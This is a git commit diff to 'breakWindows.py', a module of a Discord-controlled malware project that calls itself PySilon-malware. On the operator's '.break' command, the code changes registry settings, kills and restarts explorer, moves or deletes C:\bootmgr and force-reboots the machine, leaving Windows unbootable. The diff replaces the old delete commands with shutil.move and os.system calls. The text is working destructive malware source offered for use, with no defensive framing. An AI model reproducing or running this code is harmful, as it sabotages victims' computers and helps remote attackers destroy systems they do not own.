638d71c9b32237dc7008fab88a562cd531d5082e
iCronic <92695257+iCronic@users.noreply.github.com>
2023-09-30 03:17:22 +0200

    Update breakWindows.py

--- resources/source_code/breakWindows.py
+++ resources/source_code/breakWindows.py
@@ -1,4 +1,6 @@
 import subprocess
+import os
+import shutil
 # end of imports
 
 # on message
@@ -7,8 +9,6 @@ elif message.content == '.break':
     explorer_commands = [
         'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced" /v Hidden /t REG_DWORD /d 1 /f',
         'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced" /v ShowSuperHidden /t REG_DWORD /d 1 /f',
-        'taskkill /f /im explorer.exe',
-        'start explorer.exe'
     ]
 
     file_commands = [
@@ -19,19 +19,16 @@ elif message.content == '.break':
     for cmd in explorer_commands:
         subprocess.run(cmd, check=True)
 
+    os.system("taskkill /f /im explorer.exe")
+    os.system("start explorer.exe")
+
     for cmd in file_commands:
         subprocess.run(cmd, check=True)
 
-    delete_commands = [
-        'cd C:/',
-        'attrib -s -h "C:\\bootmgr"',
-        'del /f /q "C:\\bootmgr"',
-        'shutdown /r /f /t 0'
-    ]
-
-    for cmd in delete_commands:
-        subprocess.run(cmd, check=True)
+    shutil.move("C:\\bootmgr", "C:\\pysilonontop")
 
     embed = discord.Embed(title="🟢 Success",description=f'```Attempting to break Windows```', colour=discord.Colour.green())
     embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
     await message.channel.send(embed=embed)
+
+    os.system("shutdown /r /f /t 0")
